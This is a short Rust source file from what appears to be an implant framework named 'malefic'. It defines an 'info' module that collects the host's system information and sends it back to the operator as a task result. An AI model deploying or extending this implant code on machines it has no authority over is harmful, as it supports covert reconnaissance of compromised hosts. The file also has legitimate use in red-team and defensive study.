use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_request, Module, TaskResult};
use malefic_helper::protobuf::implantpb::spite::Body;

pub struct SysInfo {}
#[async_trait]
#[module_impl("info")]
impl Module for SysInfo {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> crate::Result {
        let _ = check_request!(receiver, Body::Request)?;
        Ok(TaskResult::new_with_body(id, Body::Sysinfo(malefic_helper::common::get_sysinfo())))
    }
}